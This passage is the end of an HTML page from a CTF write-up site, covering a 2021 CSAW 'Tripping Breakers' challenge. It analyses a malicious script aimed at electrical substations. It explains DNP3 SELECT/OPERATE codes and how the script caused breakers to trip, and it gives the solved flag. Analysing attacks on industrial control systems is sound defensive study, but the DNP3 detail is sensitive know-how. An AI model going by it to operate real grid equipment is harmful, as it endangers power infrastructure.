+<li>The IP address associated to the <code>substation_c</code>.</li>
+<li>The number of breakers that were tripped by this malicious scheduled task.</li>
+</ul>
+<p>First goal is easily completed:</p>
+<pre><code class="lang-python">substation_c = Substation(<span class="hljs-string">&apos;10.95.101.82&apos;</span>, [(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>), (<span class="hljs-number">9</span>, <span class="hljs-number">16</span>), (<span class="hljs-number">15</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">12</span>, <span class="hljs-number">5</span>)])
+</code></pre>
+<p><code>10.95.101.82</code> is the requested IP address, then we needed to understand these <code>OPT_i</code> variables, which seemed to be the different kind of operations done by the script.</p>
+<p>We looked up for documentation and found <a href="https://github.com/dnp3/opendnp3/blob/132f2fdb62ad9325efa8293fb122800ee2476aa2/generation/dnp3/src/main/scala/com/automatak/render/dnp3/enums/FunctionCode.scala" target="_blank">this script</a> which explains that <code>3</code> and <code>4</code> are respectively the <code>SELECT</code> and <code>OPERATE</code> operations on devices. One can not <code>OPERATE</code> without at first <code>SELECT</code>-ed a device, this is why in the code, the <code>OPT_1</code> packet is sent before the <code>OPT_2</code> one. Moreover, we did not find anything about the <code>OPT_3</code> value which is <code>66</code> but that is not the case for the <code>OPT_4</code> known as <code>129</code> or an operation to send a response after a request. Hence, this script sends most likely responses without being asked? This is probably what made the devices crash. After summing up the substations that sent an <code>OPT_4</code> operation, we counted 200 breakers that were tripped. Hence, our guessed flag was <code>flag{10.95.101.82:200}</code> which turned out to be the one! FLAG!</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../" class="navigation navigation-prev " aria-label="Previous page:   CSAW CTF Quals">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../FwordCTF/" class="navigation navigation-next " aria-label="Next page:   FwordCTF">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Tripping Breakers (malware analysis, 481)","level":"1.3.1","depth":2,"next":{"title":"  FwordCTF","level":"1.4","depth":1,"path":"2021/FwordCTF/README.md","ref":"2021/FwordCTF/README.md","articles":[{"title":"ParrotOx (web, 997)","level":"1.4.1","depth":2,"path":"2021/FwordCTF/web/parrotox.md","ref":"2021/FwordCTF/web/parrotox.md","articles":[]}]},"previous":{"title":"  CSAW CTF Quals","level":"1.3","depth":1,"path":"2021/CSAW-CTF-Quals/README.md","ref":"2021/CSAW-CTF-Quals/README.md","articles":[{"title":"Tripping Breakers (malware analysis, 481)","level":"1.3.1","depth":2,"path":"2021/CSAW-CTF-Quals/ics/tripping_breakers.md","ref":"2021/CSAW-CTF-Quals/ics/tripping_breakers.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["mathjax@https://github.com/algorithm-archivists/plugin-mathjax"],"root":"./","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"mathjax":{"forceSVG":false,"version":"2.6.1"},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","honkit":">= 3.0.0","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"exti0p's realm","gitbook":"*"},"file":{"path":"2021/CSAW-CTF-Quals/ics/tripping_breakers.md","mtime":"2022-05-03T20:02:25.575Z","type":"markdown"},"gitbook":{"version":"3.7.1","time":"2022-05-03T20:29:13.453Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <noscript>
+        <style>
+            .honkit-cloak {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <script>
+        // Restore sidebar state as critical path for prevent layout shift
+        function __init__getSidebarState(defaultValue){
+            var baseKey = "";
+            var key = baseKey + ":sidebar";
+            try {
+                var value = localStorage[key];
+                if (value === undefined) {
+                    return defaultValue;
+                }
+                var parsed = JSON.parse(value);
+                return parsed == null ? defaultValue : parsed;
+            } catch (e) {
+                return defaultValue;
+            }
+        }
+        function __init__restoreLastSidebarState() {
+            var isMobile = window.matchMedia("(max-width: 600px)").matches;
+            if (isMobile) {
+                // Init last state if not mobile
+                return;
+            }
+            var sidebarState = __init__getSidebarState(true);
+            var book = document.querySelector(".book");
+            // Show sidebar if it enabled
+            if (sidebarState && book) {
+                book.classList.add("without-animation", "with-summary");
+            }
+        }
+
+        try {
+            __init__restoreLastSidebarState();
+        } finally {
+            var book = document.querySelector(".book");
+            book.classList.remove("honkit-cloak");
+        }
+    </script>
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-mathjax/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
